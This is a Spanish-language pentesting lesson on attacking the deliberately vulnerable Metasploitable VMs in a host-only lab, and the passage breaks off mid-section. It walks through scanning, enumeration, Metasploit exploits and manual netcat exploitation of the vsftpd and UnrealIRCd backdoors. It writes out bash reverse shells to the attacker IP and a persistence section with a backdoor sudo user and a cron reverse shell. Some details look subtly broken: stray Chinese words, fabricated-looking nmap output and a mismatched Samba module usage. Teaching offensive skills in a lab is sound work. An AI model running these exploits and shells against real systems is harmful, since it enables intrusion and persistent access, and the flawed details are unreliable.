# CLASE 5: EXPLOTACIÓN CON METASPLOITABLE

---

## ÍNDICE

1. Introducción a Metasploitable
2. Configuración del Laboratorio
3. Fase 1: Reconocimiento y Escaneo
4. Fase 2: Enumeración de Servicios
5. Fase 3: Explotación con Metasploit Framework
6. Fase 4: Explotación Manual
7. Post-Explotación Básica
8. Laboratorio Completo Paso a Paso
9. Contramedidas

---

## 1. INTRODUCCIÓN A METASPLOITABLE

### 1.1. ¿Qué es Metasploitable?

Metasploitable es una máquina virtual diseñada específicamente para practicar pentesting. Es un sistema Ubuntu Linux intencionalmente vulnerable con docenas de servicios mal configurados y vulnerables.

```
┌─────────────────────────────────────────────────────────────────┐
│              METASPLOITABLE                                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  DEFINICIÓN:                                                    │
│  Máquina virtual Ubuntu Linux con vulnerabilidades              │
│  intencionales para practicar exploitation                      │
│                                                                 │
│  DOS VERSIONES PRINCIPALES:                                    │
│                                                                 │
│  ┌──────────────────┐    ┌──────────────────┐                │
│  │ METASPLOITABLE 2 │    │ METASPLOITABLE 3 │                │
│  ├──────────────────┤    ├──────────────────┤                │
│  │ Basado en        │    │ Basado en        │                │
│  │ Ubuntu 8.04     │    │ Ubuntu 14.04     │                │
│  │                 │    │                 │                │
│  │ Servicios        │    │ Servicios        │                │
│  │ antiguos y       │    │ más modernos    │                │
│  │ clásicos         │    │                 │                │
│  │                 │    │                 │                │
│  │ Vulnerabilidades │    │ Vulnerabilidades │                │
│  │ vsftpd, distcc, │    │ SMB, MySQL,     │                │
│  │ PHP, Samba, etc │    │ PostgreSQL,     │                │
│  │                 │    │ Jenkins, etc.    │                │
│  └──────────────────┘    └──────────────────┘                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2. Comparación de Versiones

```
┌─────────────────────────────────────────────────────────────────┐
│         COMPARACIÓN METASPLOITABLE 2 vs 3                      │
├──────────────────────────┬──────────────────┬──────────────────┤
│ CARACTERÍSTICA           │ MS2              │ MS3              │
├──────────────────────────┼──────────────────┼──────────────────┤
│ Sistema Operativo        │ Ubuntu 8.04      │ Ubuntu 14.04     │
│ Año de lanzamiento       │ 2012             │ 2016             │
│ Arquitectura             │ 32 y 64 bits     │ 64 bits          │
│ Instalación             │ VM pre-armada     │ Vagrant o build  │
│ Servicios              │ ~20              │ ~50              │
│ Nivel de dificultad     │ Básico           │ Intermedio       │
│ Enfoque                │ Conceptos        │ Escenarios       │
│                        │ clásicos         │ realistas         │
├──────────────────────────┴──────────────────┴──────────────────┤
│ VULNERABILIDADES PRINCIPALES                                   │
├─────────────────────────────────────────────────────────────────┤
│ MS2:                                                        │
│ ├── vsftpd 2.3.4 - Backdoor (CVE-2011-2523)                 │
│ ├── distcc - Command Execution (CVE-2004-2687)               │
│ ├── Samba - Symlink Traversal                                 │
│ ├── UnrealIRCd - Backdoor (CVE-2010-2075)                    │
│ ├── PHP CGI - Code Execution (CVE-2012-1823)                │
│ ├── SSH - RSA Public Key Login                                │
│ └── VNC - Password Brute Force                               │
│                                                                 │
│ MS3:                                                        │
│ ├── SMB (EternalBlue) - MS17-010                             │
│ ├── PostgreSQL - Weak Credentials                            │
│ ├── MySQL - Weak Credentials                                 │
│ ├── Jenkins - Unauthenticated CLI                            │
│ ├── Apache Struts - RCE (CVE-2017-5638)                    │
│ └── NFS - Exported Shares with Root squash disabled           │
└─────────────────────────────────────────────────────────────────┘
```

### 1.3. Topología del Laboratorio

```
┌─────────────────────────────────────────────────────────────────┐
│              TOPOLOGÍA DEL LABORATORIO                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│                      INTERNET (si aplica)                       │
│                           │                                    │
│                           ▼                                    │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │              RED HOST-ONLY (192.168.56.0/24)            │  │
│  │                                                          │  │
│  │    ┌──────────────┐                                     │  │
│  │    │ Kali Linux   │ 192.168.56.101                       │  │
│  │    │ (Atacante)   │                                     │  │
│  │    └──────┬───────┘                                     │  │
│  │           │                                              │  │
│  │           │ Atacante                                     │  │
│  │           ▼                                              │  │
│  │    ┌──────────────┐    ┌──────────────┐                │  │
│  │    │ Metasploitable│   │ Metasploitable│                │  │
│  │    │      2        │    │      3        │                │  │
│  │    │ 192.168.56.102│   │ 192.168.56.103│                │  │
│  │    └──────────────┘    └──────────────┘                │  │
│  │                                                          │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. CONFIGURACIÓN DEL LABORATORIO

### 2.1. Descarga e Instalación de Metasploitable 2

```bash
# ============================================================================
# INSTALACIÓN DE METASPLOITABLE 2
# ============================================================================

# PASO 1: Descargar
# Ir a: https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

# Descargar con wget (alternativa)
cd ~/Descargas
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/Metasploitable2.zip

# PASO 2: Extraer
unzip Metasploitable2.zip
ls -la
# Verás: Metasploitable2/metasploitable.vmdk

# PASO 3: Crear VM en VirtualBox

# Ejecutar VirtualBox y crear nueva VM:
# Nombre: Metasploitable2
# Tipo: Linux
# Versión: Ubuntu (32-bit)
# Memoria: 1024 MB
# Usar disco existente: metasploitable.vmdk

# PASO 4: Configurar red
# Red > Adaptador 1 > Solo Anfitrión (Host-Only)
# Nombre: VirtualBox Host-Only Ethernet Adapter
# Advanzado > Modo promiscuo: Permitir todo

# PASO 5: Arrancar
# Iniciar la VM
# Login: msfadmin
# Password: msfadmin

# PASO 6: Verificar IP
ifconfig
# Deberías ver eth0 con IP en 192.168.56.0/24
# typically: 192.168.56.101 o similar

# PASO 7: Si la IP no es correcta, configurar estática
sudo nano /etc/network/interfaces

# Agregar/modificar:
# auto eth0
# iface eth0 inet static
# address 192.168.56.102
# netmask 255.255.255.0
# gateway 192.168.56.1

sudo /etc/init.d/networking restart
```

### 2.2. Descarga e Instalación de Metasploitable 3

```bash
# ============================================================================
# INSTALACIÓN DE METASPLOITABLE 3 (RECOMENDADO: CON VAGRANT)
# ============================================================================

# Vagrant facilita la creación y configuración de VMs
# Instalar Vagrant (si no está):
# https://www.vagrantup.com/downloads

# Crear directorio para MS3
mkdir ~/metasploitable3 && cd ~/metasploitable3

# Inicializar Vagrant
vagrant init rapid7/metasploitable3-ub1404

# Iniciar la VM
vagrant up

# Ver estado
vagrant status

# Conectar por SSH
vagrant ssh

# Ver IP
ip addr show

# ============================================================================
# INSTALACIÓN MANUAL (SI NO USAS VAGRANT)
# ============================================================================

# Opción 1: Descargar OVA pre-configurado
# Buscar en: https://github.com/rsmusllp/breaching-defense

# Opción 2: Build desde cero
# Requiere:
# - Ubuntu 14.04 Server ISO
# - Instalar servicios vulnerables manualmente
# - Esta opción es compleja, se recomienda Vagrant
```

### 2.3. Configuración de Red en Todas las VMs

```bash
# ============================================================================
# CONFIGURACIÓN DE RED EN VIRTUALBOX (TODAS LAS VMs)
# ============================================================================

# Ir a VirtualBox > Archivo > Herramientas > Administrador de Red Host-Only

# Verificar que existe vboxnet0 con:
# IP: 192.168.56.1
# DHCP: Habilitado
# Rango: 192.168.56.101 - 192.168.56.254

# CONFIGURAR CADA VM:

# ┌─────────────────┬──────────────────────┬──────────────────┐
# │ VM              │ Adaptador 1          │ IP Esperada      │
# ├─────────────────┼──────────────────────┼──────────────────┤
# │ Kali Linux      │ Host-Only            │ 192.168.56.101   │
# │ Metasploitable2 │ Host-Only            │ 192.168.56.102   │
# │ Metasploitable3 │ Host-Only            │ 192.168.56.103   │
# │ Ubuntu          │ Host-Only            │ 192.168.56.104   │
# └─────────────────┴──────────────────────┴──────────────────┘

# Verificar conectividad desde Kali:
ping 192.168.56.102 -c 3  # Metasploitable 2
ping 192.168.56.103 -c 3  # Metasploitable 3
```

### 2.4. Iniciar Metasploit Framework en Kali

```bash
# ============================================================================
# PREPARAR KALI PARA EXPLOITATION
# ============================================================================

# Actualizar Kali
sudo apt update && sudo apt upgrade -y

# Verificar que Metasploit está instalado
msfconsole --version

# Si no está instalado:
sudo apt install metasploit-framework

# O usar la versión de Docker (más actualizada)
docker pull metasploitframework/metasploit-framework
docker run -it metasploitframework/metasploit-framework

# Verificar servicios de base de datos
# Metasploit usa PostgreSQL para almacenar datos
sudo systemctl start postgresql
sudo systemctl enable postgresql

# Inicializar base de datos de Metasploit
sudo msfdb init

# O desde msfconsole:
# > db_status  (verificar conexión)
# > db_rebuild_cache  (reconstruir cache de módulos)
```

---

## 3. FASE 1: RECONOCIMIENTO Y ESCANEO

### 3.1. Descubrimiento de Hosts

```bash
# ============================================================================
# DESCUBRIMIENTO DE HOSTS EN LA RED
# ============================================================================

# Desde Kali Linux:

# PASO 1: Ver interfaces de red
ip a
# Deberías ver eth0 o enp0s3 con IP 192.168.56.101

# PASO 2: Escaneo de hosts activos
nmap -sn 192.168.56.0/24

# SALIDA ESPERADA:
# Starting Nmap 7.94
# Nmap scan report for 192.168.56.1
# Host is up (0.00073s latency).
# MAC Address: 0A:00:27:00:00:00 (VirtualBox)
# 
# Nmap scan report for 192.168.56.101
# Host is up (0.00042s latency).
# MAC Address: 08:00:27:8E:8A:A8 (VirtualBox)
# 
# Nmap scan report for 192.168.56.102
# Host is up (0.0011s latency).
# MAC Address: 08:00:27:5E:4B:1A (VirtualBox)
# 
# Nmap scan report for 192.168.56.103
# Host is up (0.0012s latency).
# MAC Address: 08:00:27:3F:2A:1C (VirtualBox)

# PASO 3: Verificar que Metasploitable responde
ping -c 3 192.168.56.102
```

### 3.2. Escaneo de Puertos

```bash
# ============================================================================
# ESCANEO DE PUERTOS - METASPLOITABLE 2
# ============================================================================

# ESCANEO BÁSICO DE PUERTOS (Rápido)
nmap -T4 -F 192.168.56.102

# SALIDA ESPERADA:
# Not shown: 996 closed tcp ports (filtered ports)
# PORT     STATE SERVICE
# 21/tcp   open  ftp
# 22/tcp   open  ssh
# 23/tcp   open  telnet
# 80/tcp   open  http
# ...

# ESCANEO COMPLETO DE TODOS LOS PUERTOS
nmap -p- -T4 -A 192.168.56.102 -oA ms2_full_scan

# Explicación de parámetros:
# -p-         = Todos los puertos (1-65535)
# -T4         = Timing rápido (0-5)
# -A          = Detección de SO, servicios, versiones, scripts
# -oA archivo = Guardar en todos los formatos

# Ver resultado guardado
cat ms2_full_scan.nmap

# ESCANEO DE SERVICIOS CON DETECCIÓN DE VERSIONES
nmap -sV -sC -p- 192.168.56.102 -oA ms2_services

# Parámetros:
# -sV  = Detectar versiones de servicios
# -sC  = Ejecutar scripts por defecto de NSE

# SALIDA ESPERADA:
# PORT     STATE SERVICE     VERSION
# 21/tcp   open  ftp         vsftpd 2.3.4
# 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 10ubuntu1 (protocol 2.0)
# 23/tcp   open  telnet      Linux telnetd
# 25/tcp   open  smtp        Postfix smtpd
# 53/tcp   open  domain      ISC BIND 9.4.2
# 80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4)
# 111/tcp  open  rpcbind     2 (RPC #100000)
# 139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
# 445/tcp  open  netbios-ssn Samba smbd 3.X
# 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
# 5432/tcp open  postgresql  PostgreSQL DB 8.3.0
# 5900/tcp open  vnc         VNC (protocol 3.3)
# 6000/tcp open  X11         (access denied)
# 6667/tcp open  irc         UnrealIRCd
# 8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
```

### 3.3. Escaneo de Vulnerabilidades con NSE

```bash
# ============================================================================
# ESCANEO DE VULNERABILIDADES CON SCRIPTS NSE
# ============================================================================

# ESCANEO DE VULNERABILIDADES BÁSICAS
nmap --script vuln 192.168.56.102 -oA ms2_vulns

# SALIDA ESPERADA (fragmentos):
# PORT     STATE SERVICE
# 21/tcp   open  ftp
# |_ftp-vsftpd-backdoor: FTP BACKDOOR Command Execution
# |  This backend has been modified to include an anonymous
# |  FTP account 'msfadmin:msfadmin' that drops a payload.

# 23/tcp   open  telnet
# |_telnet-encryption: ILLEGAL ENCRYPTION MODE REQUIRED

# 80/tcp   open  http
# |_http-csrf: 
# | Spidering limited to: tags> | links> | directory>/
# |_http-sql-injection: Could not find any SQL injection vulnerabilities.
# |_http-stored-xss: Could not verify stored XSS vulnerabilities.

# Scripts útiles por categoría:
# auth        = Scripts de autenticación
# broadcast   = Scripts de broadcast
# brute       = Scripts de fuerza bruta
# default     = Scripts por defecto
# discovery   = Scripts de descubrimiento
# dos         = Scripts de denegación de servicio
# exploit     = Scripts de explotación
# external    = Scripts externos
# fuzzer      = Scripts de fuzzing
# intrusive   = Scripts intrusivos
# malware     = Scripts de malware
# safe        = Scripts seguros
# version     = Scripts de versión
# vuln        = Scripts de vulnerabilidades

# EJECUTAR SCRIPTS DE UNA CATEGORÍA ESPECÍFICA
nmap --script=exploit 192.168.56.102

# VERIFICAR VULNERABILIDADES CONOCIDAS
nmap -p21 --script=ftp-vsftpd-backdoor 192.168.56.102
nmap -p21 --script=ftp-bounce 192.168.56.102

# ESCANEAR PUERTOS COMUNES CON SCRIPTS DE VULNERABILIDAD
nmap --script vulners -sV 192.168.56.102
# (Requiere script vulners.nse)
```

---

## 4. FASE 2: ENUMERACIÓN DE SERVICIOS

### 4.1. Enumeración FTP

```bash
# ============================================================================
# ENUMERACIÓN FTP
# ============================================================================

# CONECTARSE COMO ANÓNIMO
ftp 192.168.56.102
# Name: anonymous
# Password: anonymous@ 或 tu email
# ls -la  # Listar archivos

# Verificar si permite acceso anónimo
nmap --script ftp-anon 192.168.56.102

# Probarvsftpd backdoor (CVE-2011-2523)
# Este exploit está en Metasploit, pero verificamos primero
nc 192.168.56.102 21
# Trying 192.168.56.102...
# Connected to 192.168.56.102.
# 220 (vsFTPd 2.3.4)

# Si el backdoor existe, conectando con :) en USER triggers shell
# Verificado con Metasploit más adelante
```

### 4.2. Enumeración SMB

```bash
# ============================================================================
# ENUMERACIÓN SMB
# ============================================================================

# ENUM4LINUX (Herramienta específica para SMB)
enum4linux -a 192.168.56.102

# SALIDA ESPERADA:
# ==========================================
# |   Target Information                   |
# ==========================================
# Target ........... 192.168.56.102
# 
# ==========================================
# |   Share Enumeration                   |
# ==========================================
# 
# [+] Got domain/workgroup name: WORKGROUP
# 
# [+] Finding share permissions
# 
# Share name      Description      Comment
# ---------       -----------      -------
# tmp             print$           IPC$ (I)
# IPC$            IPC Service (Samba 3.0.20-Debian)
# 
# ==========================================
# |   User Information Through SID         |
# ==========================================
# 
# [+]  Enumerating users
# 
# found:   S-1-22-1-1000 Unix User\msfadmin
# found:   S-1-22-1-1001 Unix User\postgres
# ...

# ENUMERAR USUARIOS CON SMBCLIENT
smbclient -L //192.168.56.102 -N

# CONECTARSE A UN SHARE
smbclient //192.168.56.102/tmp -N
# smb: \> ls
# smb: \> get archivo.txt
```

### 4.3. Enumeración HTTP

```bash
# ============================================================================
# ENUMERACIÓN HTTP
# ============================================================================

# ESCANEO CON NIKTO
nikto -h http://192.168.56.102

# SALIDA ESPERADA:
# - Nikto v2.5.0
# + Target IP:          192.168.56.102
# + Target Port:        80
# + Started:            ...
# + Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4
# + /phpinfo.php - Returns PHP version information
# + /test.php - Tests PHP installation and displays information
# + /index - Default Apache page
# + /mutillidae - Vuln web app
# ...

# ENUMERAR DIRECTORIOS CON DIRB
dirb http://192.168.56.102 /usr/share/wordlists/dirb/common.txt

# CON GOBUSTER (MÁS RÁPIDO)
gobuster dir -u http://192.168.56.102 \
    -w /usr/share/wordlists/dirb/common.txt \
    -x php,html,txt

# IDENTIFICAR TECNOLOGÍAS
whatweb http://192.168.56.102

# VER PÁGINA PRINCIPAL
curl -s http://192.168.56.102 | head -50
```

### 4.4. Enumeración de Otros Servicios

```bash
# ============================================================================
# ENUMERACIÓN DE MySQL
# ============================================================================

# INTENTAR CONEXIÓN
mysql -h 192.168.56.102 -u root
# Puede funcionar sin contraseña en Metasploitable

# CON NMAP
nmap --script mysql-info,mysql-enum,mysql-users 192.168.56.102

# ============================================================================
# ENUMERACIÓN DE PostgreSQL
# ============================================================================

# INTENTAR CONEXIÓN
psql -h 192.168.56.102 -U postgres
# Password típico: postgres

# ============================================================================
# ENUMERACIÓN DE IRC (UnrealIRCd)
# ============================================================================

# CONECTARSE AL IRC
nc 192.168.56.102 6667
# Ver versión
INFO
# Puede tener backdoor (CVE-2010-2075)
```

---

## 5. FASE 3: EXPLOTACIÓN CON METASPLOIT FRAMEWORK

### 5.1. Introducción a Metasploit Framework

```
┌─────────────────────────────────────────────────────────────────┐
│              METASPLOIT FRAMEWORK                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ESTRUCTURA DE MÓDULOS:                                        │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │                    MÓDULOS                               │   │
│  ├──────────────────────────────────────────────────────────┤   │
│  │                                                          │   │
│  │  auxiliary    → Herramientas de apoyo                   │   │
│  │                 (scanners, fuzzers, spoofers)            │   │
│  │                                                          │   │
│  │  exploit      → Módulos de explotación                  │   │
│  │                 (usan un payload para ejecutar código)    │   │
│  │                                                          │   │
│  │  payload      → Código a ejecutar                        │   │
│  │                 (shell, meterpreter, etc.)                │   │
│  │                                                          │   │
│  │  encoder      → Ofuscan payloads para evade AV          │   │
│  │                                                          │   │
│  │  nop           → Generan código NOP para padding         │   │
│  │                                                          │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  PAYLOADS COMUNES:                                             │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │                                                          │   │
│  │  BIND SHELL:                                             │   │
│  │  Victima abre puerto, atacante conecta                   │   │
│  │  → Bueno cuando victima tiene IP pública                 │   │
│  │                                                          │   │
│  │  REVERSE SHELL:                                          │   │
│  │  Victima conecta a atacante                              │   │
│  │  → Bueno para evadir firewalls (victima inicia)        │   │
│  │  → Más común en pentesting                              │   │
│  │                                                          │   │
│  │  METERPRETER:                                            │   │
│  │  Shell avanzada con funcionalidades adicionales          │   │
│  │  (文件系统, process, captura de pantalla, etc.)         │   │
│  │                                                          │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 5.2. Iniciar Metasploit

```bash
# ============================================================================
# INICIAR METASPLOIT
# ============================================================================

# Iniciar PostgreSQL (requerido para bases de datos)
sudo systemctl start postgresql
sudo systemctl status postgresql

# Iniciar msfconsole
msfconsole

# Dentro de msfconsole:

# Verificar conexión a base de datos
db_status

# Si no está conectado:
# > db_connect postgres:postgres@127.0.0.1:5432/msf
# O inicializar base de datos:
# > msfdb init

# Comandos básicos de msfconsole:
# ?                    → Ayuda
# help                 → Lista completa de comandos
# search <término>     → Buscar módulo
# use <módulo>         → Seleccionar módulo
# show options         → Ver opciones del módulo
# show payloads        → Ver payloads disponibles
# show targets         → Ver sistemas objetivo soportados
# set <opción> <valor> → Establecer opción
# unset <opción>       → Quitar opción
# exploit              → Ejecutar exploit
# run                  → Ejecutar (para auxiliary)
# sessions -l          → Listar sesiones activas
# sessions -i <id>     → Interactuar con sesión
# background           → Enviar sesión a background
# exit                 → Salir
```

### 5.3. Explotación de vsftpd 2.3.4 (Backdoor)

```bash
# ============================================================================
# EXPLOIT: vsftpd 2.3.4 Backdoor Command Execution
# CVE-2011-2523
# ============================================================================

# En msfconsole:

# PASO 1: BUSCAR EL EXPLOIT
search vsftpd

# SALIDA:
# Matching Modules
# ================
# 
#    Name                              Disclosure Date  Rank   Description
#    ----                              ---------------  ----   -----------
#    0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-18  excellent  VSFTPD 2.3.4 Backdoor Command Execution


# PASO 2: SELECCIONAR EL EXPLOIT
use exploit/unix/ftp/vsftpd_234_backdoor

# PASO 3: VER OPCIONES
show options

# SALIDA:
# Name   Current Setting  Required  Description
#    ----   ---------------  --------  -----------
#    RHOSTS                   yes       The target host(s), see https://github.com/.../docs
#    RPORT  21                no        The target port (TCP)


# PASO 4: CONFIGURAR PARÁMETROS
set RHOSTS 192.168.56.102
set RPORT 21

# Verificar
show options

# PASO 5: VER PAYLOADS DISPONIBLES
show payloads

# SALIDA:
# ...
# 45  payload/cmd/unix/bind_perl        normal     Unix Command Shell, Bind TCP (via Perl)
# 46  payload/cmd/unix/reverse_perl     normal     Unix Command Shell, Reverse TCP (via Perl)
# ...

# PASO 6: SELECCIONAR PAYLOAD
set PAYLOAD cmd/unix/reverse_perl

# PASO 7: CONFIGURAR PAYLOAD
set LHOST 192.168.56.101  # IP de Kali
set LPORT 4444            # Puerto de escucha

# PASO 8: VERIFICAR CONFIGURACIÓN FINAL
show options

# Deberías ver:
# RHOSTS => 192.168.56.102
# RPORT => 21
# LHOST => 192.168.56.101
# LPORT => 4444
# PAYLOAD => cmd/unix/reverse_perl

# PASO 9: EJECUTAR EXPLOIT
exploit

# SALIDA ESPERADA:
# [*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
# [*] 192.168.56.102:21 - USER: msfadmin:)
# [+] 192.168.56.102:21 - Backdoor service has been spawned; handler -d should be running in a third party...
# [*] Command shell session 1 opened ...

# PAS0 10: INTERACTUAR CON LA SESIÓN
# Ya tienes shell! Ahora puedes ejecutar comandos:
whoami
# Output: root

uname -a
# Output: Linux metasploitable 2.6.24-16-server #1 SMP ...

# Ver directorio
ls -la /home/msfadmin

# Establecer shell interactiva
shell
# python -c "import pty; pty.spawn('/bin/bash')"

# FELICIDADES! Has comprometido Metasploitable 2
```

### 5.4. Explotación de distcc

```bash
# ============================================================================
# EXPLOIT: distcc Daemon Command Execution
# CVE-2004-2687
# ============================================================================

# En msfconsole:

# BUSCAR Y SELECCIONAR EXPLOIT
search distcc
use exploit/unix/misc/distcc_exec

# CONFIGURAR
set RHOSTS 192.168.56.102
set RPORT 3632

# VER PAYLOADS
show payloads

# USAR PAYLOAD REVERSE PYTHON
set PAYLOAD cmd/unix/reverse_python

# CONFIGURAR PAYLOAD
set LHOST 192.168.56.101
set LPORT 4445

# EJECUTAR
exploit

# Si funciona, tendrás shell
whoami
# Output: daemon
```

### 5.5. Explotación de UnrealIRCd (Backdoor)

```bash
# ============================================================================
# EXPLOIT: UnrealIRCd 3.2.8.1 Backdoor Command Execution
# CVE-2010-2075
# ============================================================================

# En msfconsole:

search unrealircd
use exploit/unix/irc/unreal_ircd_3281_backdoor

# CONFIGURAR
set RHOSTS 192.168.56.102
set RPORT 6667

# PAYLOAD
set PAYLOAD cmd/unix/reverse_perl

# CONFIGURAR PAYLOAD
set LHOST 192.168.56.101
set LPORT 4446

# EJECUTAR
exploit

# SALIDA ESPERADA:
# [*] 192.168.56.102:6667 - Connected to 192.168.56.102:6667...
# [*] 192.168.56.102:6667 - Sending attacker commands...
# [*] Command shell session 2 opened ...
```

### 5.6. Explotación de PHP CGI

```bash
# ============================================================================
# EXPLOIT: PHP CGI Remote Code Execution
# CVE-2012-1823
# ============================================================================

# En msfconsole:

search php cgi
use exploit/multi/http/php_cgi_arg_injection

# CONFIGURAR
set RHOSTS 192.168.56.102
set RPORT 80

# CONFIGURAR PAYLOAD
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4447

# EJECUTAR
exploit

# Si funciona, tendrás meterpreter
meterpreter > sysinfo
meterpreter > getuid
```

### 5.7. Explotación de Samba (symlink traversal)

```bash
# ============================================================================
# EXPLOIT: Samba symlink Traversal
# ============================================================================

# En msfconsole:

search samba symlink
use exploit/unix/smb/samba_symlink_traversal

# CONFIGURAR
set RHOSTS 192.168.56.102
set SMBUser msfadmin
set SMBPass msfadmin

# CONFIGURAR PAYLOAD
set PAYLOAD cmd/unix/reverse_perl
set LHOST 192.168.56.101
set LPORT 4448

# EJECUTAR
exploit
```

---

## 6. FASE 4: EXPLOTACIÓN MANUAL

### 6.1. Explotación Manual de vsftpd

```bash
# ============================================================================
# EXPLOIT MANUAL: vsftpd 2.3.4 Backdoor
# ============================================================================

# SIN METASPLOIT - Solo con netcat!

# PASO 1: CONECTARSE AL SERVIDOR FTP
nc 192.168.56.102 21

# Deberías ver:
# 220 (vsFTPd 2.3.4)

# PASO 2: ENVIAR USERNAME CON CARÁCTER ESPECIAL
USER msfadmin:)

# Deberías ver:
# 331 Please specify the password.

# PASO 3: ENVIAR CUALQUIER CONTRASEÑA
PASS cualquier_cosa

# Después de esto, el backdoor debería abrir un shell en el puerto 6200

# PASO 4: CONECTARSE AL SHELL
# Esperar un momento
sleep 2

# Conectar al shell
nc 192.168.56.102 6200

# ¡YA ESTÁS EN! (Pero puede que seas root dependiendo de permisos)
whoami
# Puede responder: root

# Ver información del sistema
uname -a
cat /etc/passwd

# Crear shell completamente interactiva
python -c "import pty; pty.spawn('/bin/bash')"

# Esto te da una shell bash completa
```

### 6.2. Explotación Manual de IRC

```bash
# ============================================================================
# EXPLOIT MANUAL: UnrealIRCd Backdoor
# ============================================================================

# El backdoor en UnrealIRCd permite ejecutar comandos
# enviando "AB; comando" al IRC

# PASO 1: CONECTARSE AL IRC
nc 192.168.56.102 6667

# PASO 2: ENVIAR COMANDOS IRC BÁSICOS
NICK testuser
USER test 0 * :Test User

# PASO 3: ENVIAR COMANDO DE EXPLOIT
# Sintaxis: AB;comando_a_ejecutar
AB;id

# Deberías ver respuesta con uid, gid, etc.

# EJECUTAR SHELL REVERSA MANUALMENTE
# En Kali, abrir listener:
nc -lvp 4449

# En IRC:
AB;bash -i >& /dev/tcp/192.168.56.101/4449 0>&1

# Si funciona, ganarás shell en Kali
```

### 6.3. Fuerza Bruta a VNC

```bash
# ============================================================================
# FUERZA BRUTA A VNC CON HYDRA
# ============================================================================

# VNC permite acceso gráfico remoto
# En Metasploitable 2, a veces tiene contraseña vacía

# OPCIÓN 1: CON HYDRA
hydra -P /usr/share/wordlists/rockyou.txt \
       -t 4 \
       192.168.56.102 vnc

# OPCIÓN 2: CON METASPLOIT AUXILIAR
# En msfconsole:
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.56.102
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run

# SALIDA (si tiene contraseña vacía):
# [+] 192.168.56.102:5900 - SUCCESS: \":\" 
# (Contraseña vacía encontrada)

# OPCIÓN 3: CONECTARSE MANUALMENTE
# En Kali:
vncviewer 192.168.56.102

# Si la contraseña está vacía, solo presionar Enter
```

---

## 7. POST-EXPLOTACIÓN BÁSICA

### 7.1. Después de Obtener Shell

```bash
# ============================================================================
# POST-EXPLOTACIÓN EN METASPLOITABLE 2
# ============================================================================

# ASUMIMOS QUE YA TIENES UNA SESIÓN EN MSFCONSOLE

# COMANDOS DE METERPRETER (si usaste payload meterpreter):
meterpreter > help
meterpreter > sysinfo
meterpreter > getuid
meterpreter > pwd
meterpreter > ls

# SUBIR ARCHIVOS
meterpreter > upload /ruta/local/malware /tmp/

# DESCARGAR ARCHIVOS
meterpreter > download /etc/passwd /tmp/passwd

# SHELL INTERACTIVA
meterpreter > shell
# Dentro de shell:

# COMANDOS BÁSICOS DE SHELL:
whoami                    # Usuario actual
id                        # UID, GID, grupos
uname -a                  # Información del sistema
cat /etc/issue           # Sistema operativo
cat /etc/passwd          # Usuarios del sistema
cat /etc/shadow          # Hashes de contraseñas (si tienes root)
ls -la /home/            # directorios home
ls -la /tmp/             # archivos temporales
df -h                    # disco
netstat -tulpn           # puertos escuchando
ps aux                   # procesos
crontab -l              # tareas cron
sudo -l                 # permisos sudo

# ESCALADA DE PRIVILEGIOS (si no eres root)
sudo su                  # Si msfadmin tiene permisos sudo
# Password: msfadmin (o "sudo" para algunos sistemas)

# VERIFICAR SI ERES ROOT
id
# uid=0(root) gid=0(root) groups=0(root)
# Si ves uid=0, ¡ERES ROOT!

# EXPLORAR SISTEMA COMO ROOT
ls /root
cat /root/.bash_history
cat /etc/shadow
# Ver hashes y crackearlos con John (ver Clase 4)
```

### 7.2. Persistencia (para pentesting ético, documento y reporta)

```bash
# ============================================================================
# NOTA IMPORTANTE
# ============================================================================
# En un pentesting real, la persistencia NO se debe implementar
# sin autorización explícita del cliente.
# 
# Este conocimiento es para:
# 1. Entender cómo funcionan los atacantes
# 2. Probar que puedes mantener acceso
# 3. Documentar si se logra persistencia
# ============================================================================

# MÉTODOS DE PERSISTENCIA (SOLO PARA APRENDIZAJE):

# Crear usuario backdoor (NO HACER EN PENTESTING REAL)
useradd -m -s /bin/bash backdoor
passwd backdoor
# Establecer contraseña

# Agregar a sudo (riesgo)
usermod -aG sudo backdoor

# Modificar SSH config para permitir root login
# sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config

# CRON para shell reverso automático
# echo "*/5 * * * * /bin/bash -i >& /dev/tcp/192.168.56.101/5555 0>&1" >> /etc/crontab

# ============================================================================
# LIMPIEZA (AL TERMINAR PENTESTING)
# ============================================================================
# SIEMPRE LIMPIAR después de practicar:
# - Eliminar usuarios creados
# - Restaurar archivos modificados
# - Eliminar archivos subidos
# ============================================================================
```

### 7.3. Movimiento Lateral

```bash
# ============================================================================
# MOVIMIENTO LATERAL (DESDE METASPLOITABLE A OTROS)
# ============================================================================

# Desde la shell en Metasploitable 2:

# VER REDES INTERNAS
ip addr
# Puede que haya múltiples interfaces

# VER TABLA DE ENRUTAMIENTO
route -n

# ESCANEAR REDES INTERNAS
for ip in $(seq 1 254); do
    ping -c 1 -W 1 192.168.56.$ip &
done | grep "bytes from"

# INTENTAR CONECTARSE A OTROS SERVICIOS
# SSH a otros hosts
ssh user@192.168.56.103

# BASE DE DATOS
mysql -h 192.168.56.103 -u root

# COMPARTIR ARCHIVOS
